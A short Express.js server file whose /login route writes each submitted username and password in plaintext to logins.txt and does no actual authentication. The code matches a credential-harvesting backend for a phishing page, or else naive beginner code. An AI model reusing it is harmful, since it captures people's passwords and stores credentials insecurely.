// importing modules
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

// run an instance of express
const app = express();

// parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (like HTML)
app.use(express.static(path.join(__dirname, 'public')));

// post request from the login form
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // writing the username and password to file
    const loginDetails = `Username: ${username}, Password: ${password}\n`;
    
    fs.appendFile('logins.txt', loginDetails, (err) => {
        if (err) {
            console.error('Error writing to file', err);
            res.status(500).send('Error saving login details');
        } else {
            console.log('Login details saved');
            res.send('Login details saved successfully');
        }
    });
});

// starting the server
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});

